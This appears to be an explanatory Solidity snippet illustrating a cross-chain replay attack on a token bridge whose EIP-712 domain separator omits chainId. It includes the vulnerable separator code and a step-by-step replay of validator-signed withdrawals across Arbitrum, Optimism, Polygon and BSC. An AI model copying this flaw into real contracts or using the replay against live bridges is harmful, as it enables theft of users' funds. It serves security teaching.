// ⚠️ Vulnerable domain separator — missing chainId!
bytes32 DOMAIN_SEPARATOR = keccak256(abi.encode(
    keccak256("EIP712Domain(string name,string version,address verifyingContract)"),
    keccak256("TokenBridge"),
    keccak256("1"),
    // Missing: block.chainid  ← CRITICAL OMISSION
    address(this)
));

// Validators sign the withdrawal struct
bytes32 structHash = keccak256(abi.encode(
    WITHDRAW_TYPEHASH,
    msg.sender,     // recipient
    100 ether,      // amount
    nonce           // replay protection (same chain only!)
));

bytes32 digest = keccak256(abi.encodePacked(
    "\x19\x01",
    DOMAIN_SEPARATOR,  // ⚠️ Same on both chains!
    structHash
));
// Validators sign this digest
// signature is valid wherever DOMAIN_SEPARATOR matches

// Legitimate withdrawal on Chain A
bridge.executeWithdrawal(
    recipient,  // attacker address
    100 ether,  // amount
    nonce,      // 42
    signatures  // validator multi-sig
);
// ✓ Attacker receives 100 ETH on Chain A
// Attacker saves: (recipient, amount, nonce, signatures)

// ⚠️ REPLAY on Chain B (Arbitrum)
// Same contract address, same domain separator
bridge_chainB.executeWithdrawal(
    recipient,  // same attacker address
    100 ether,  // same amount
    nonce,      // 42 — NOT USED on Chain B!
    signatures  // same validator signatures — still valid!
);

// Verification passes because:
// 1. DOMAIN_SEPARATOR is identical (no chainId)
// 2. Nonce 42 is fresh on Chain B
// 3. Validator signatures are cryptographically valid

// Attacker can replay on EVERY chain the bridge supports
// Chain C (Optimism), Chain D (Polygon), Chain E (BSC)...

address[] chains = [arbitrum, optimism, polygon, bsc];
for (uint i = 0; i < chains.length; i++) {
    bridge[chains[i]].executeWithdrawal(
        recipient, 100 ether, nonce, signatures
    );
}

